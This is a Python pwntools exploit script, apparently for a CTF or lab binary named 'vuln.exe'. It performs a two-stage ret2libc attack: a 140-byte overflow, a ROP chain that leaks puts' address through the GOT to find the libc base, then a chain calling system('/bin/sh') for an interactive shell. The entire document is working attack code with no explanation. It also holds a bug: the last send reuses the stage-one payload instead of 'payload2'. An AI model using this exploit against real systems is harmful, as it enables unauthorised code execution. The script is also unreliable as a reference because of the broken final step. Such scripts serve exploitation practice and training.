#! /usr/bin/env python

from pwn import *
from pprint import pprint

offset = 140

exe = context.binary = ELF("./vuln.exe")
#pprint(exe.symbols)
libc = ELF("/usr/lib32/libc.so.6")
#pprint(libc.symbols)

context.update(arch='i386', os="linux")
p = exe.process()

p.recvline()
payload = [
    b"A"*offset,
    p32(exe.symbols['main'])
]
p.sendline(b"".join(payload))
p.recvline() # receive the text that is printed
p.recvline() # receive the "Give me some text"

rop = ROP(exe)
rop.call(exe.symbols['puts'], [exe.got['puts']])
rop.call(exe.symbols['main'])
log.info("Stage I ROP Chain:\n" + rop.dump())

payload = [
    b"A"*offset,
    rop.chain()
]
payload = b"".join(payload)
p.sendline(payload)
p.recvline()
puts_add = u32(p.recvline()[:4])
log.info(f"puts found at {hex(puts_add)}")

# use puts address to find base address of libc
libc.address = puts_add - libc.symbols['puts']
print('libc base address', hex(libc.address))
rop2 = ROP(exe)
system_add = libc.symbols['system']
binsh_add = next(libc.search(b'/bin/sh'))
rop2.call(system_add, [binsh_add])
log.info("Stage II ROP Chain:\n" + rop2.dump())
#rop.clear_cache()
#rop.system(next)
payload2 = [
    b"A"*offset,
    rop2.chain()
]
payload2 = b"".join(payload2)
p.sendline(payload)
p.interactive()